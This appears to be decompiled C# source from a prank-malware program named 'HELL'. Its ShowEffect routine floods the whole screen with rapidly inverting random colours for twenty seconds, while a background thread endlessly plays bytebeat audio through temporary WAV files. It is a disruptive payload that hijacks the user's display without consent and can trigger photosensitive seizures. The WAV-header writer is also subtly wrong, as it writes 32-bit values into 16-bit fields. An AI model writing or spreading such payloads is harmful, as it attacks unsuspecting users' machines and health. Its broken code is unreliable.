using System;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;

namespace HELL
{
	// Token: 0x02000011 RID: 17
	internal class Program
	{
		// Token: 0x06000096 RID: 150
		[DllImport("user32.dll")]
		private static extern IntPtr GetDC(IntPtr hWnd);

		// Token: 0x06000097 RID: 151
		[DllImport("user32.dll")]
		private static extern int GetSystemMetrics(int nIndex);

		// Token: 0x06000098 RID: 152
		[DllImport("gdi32.dll")]
		private static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYTop, int nWidth, int nHeight, uint dwRop);

		// Token: 0x06000099 RID: 153
		[DllImport("gdi32.dll")]
		private static extern IntPtr CreateSolidBrush(uint crColor);

		// Token: 0x0600009A RID: 154
		[DllImport("gdi32.dll")]
		private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hObject);

		// Token: 0x0600009B RID: 155
		[DllImport("gdi32.dll")]
		private static extern bool DeleteObject(IntPtr hObject);

		// Token: 0x0600009C RID: 156
		[DllImport("kernel32.dll")]
		private static extern uint GetTickCount();

		// Token: 0x0600009D RID: 157
		[DllImport("kernel32.dll")]
		private static extern void Sleep(uint dwMilliseconds);

		// Token: 0x0600009E RID: 158 RVA: 0x000049A4 File Offset: 0x00002BA4
		private static uint randomDistortedColor()
		{
			int num = (Program.rand.Next(256) + Program.rand.Next(256)) / 2;
			int num2 = (Program.rand.Next(256) + Program.rand.Next(256)) / 2;
			int num3 = (Program.rand.Next(256) + Program.rand.Next(256)) / 2;
			num = (num + Program.rand.Next(128) - 94) % 256;
			num2 = (num2 + Program.rand.Next(128) - 74) % 256;
			num3 = (num3 + Program.rand.Next(128) - 94) % 256;
			return (uint)((num << 16) | (num2 << 8) | num3);
		}

		// Token: 0x0600009F RID: 159 RVA: 0x00004A78 File Offset: 0x00002C78
		public static void ShowEffect()
		{
			IntPtr dc = Program.GetDC(IntPtr.Zero);
			int systemMetrics = Program.GetSystemMetrics(0);
			int systemMetrics2 = Program.GetSystemMetrics(1);
			uint tickCount = Program.GetTickCount();
			new Thread(new ThreadStart(Program.PlayBytebeatSound))
			{
				IsBackground = true
			}.Start();
			while (Program.GetTickCount() - tickCount < 20000U)
			{
				Thread.Sleep(1);
				IntPtr intPtr = Program.CreateSolidBrush(Program.randomDistortedColor());
				Program.SelectObject(dc, intPtr);
				Program.PatBlt(dc, 0, 0, systemMetrics, systemMetrics2, 5898313U);
				Program.DeleteObject(intPtr);
			}
			Program.DeleteObject(dc);
		}

		// Token: 0x060000A0 RID: 160 RVA: 0x00004B1C File Offset: 0x00002D1C
		private static void PlayBytebeatSound()
		{
			byte[] array = new byte[4410];
			int num = 0;
			for (;;)
			{
				byte b = (byte)(2 * num * num * (num >> 12) / 8);
				array[num % array.Length] = b;
				num++;
				string text = Path.GetTempFileName().Replace(".tmp", ".wav");
				Program.WriteWavFile(text, array, 44100);
				using (SoundPlayer soundPlayer = new SoundPlayer(text))
				{
					soundPlayer.PlaySync();
				}
				File.Delete(text);
			}
		}

		// Token: 0x060000A1 RID: 161 RVA: 0x00004BB4 File Offset: 0x00002DB4
		private static void WriteWavFile(string filePath, byte[] soundBuffer, int sampleRate)
		{
			using (FileStream fileStream = new FileStream(filePath, FileMode.Create))
			{
				using (BinaryWriter binaryWriter = new BinaryWriter(fileStream))
				{
					binaryWriter.Write("RIFF".ToCharArray());
					binaryWriter.Write(36 + soundBuffer.Length);
					binaryWriter.Write("WAVE".ToCharArray());
					binaryWriter.Write("fmt ".ToCharArray());
					binaryWriter.Write(16);
					binaryWriter.Write(1);
					binaryWriter.Write(1);
					binaryWriter.Write(sampleRate);
					binaryWriter.Write(sampleRate);
					binaryWriter.Write(1);
					binaryWriter.Write(8);
					binaryWriter.Write("data".ToCharArray());
					binaryWriter.Write(soundBuffer.Length);
					binaryWriter.Write(soundBuffer);
				}
			}
		}

		// Token: 0x04000032 RID: 50
		private const int SM_CXSCREEN = 0;

		// Token: 0x04000033 RID: 51
		private const int SM_CYSCREEN = 1;

		// Token: 0x04000034 RID: 52
		private const uint PATINVERT = 5898313U;

		// Token: 0x04000035 RID: 53
		private const uint SRCCOPY = 13369376U;

		// Token: 0x04000036 RID: 54
		private static Random rand = new Random();
	}
}
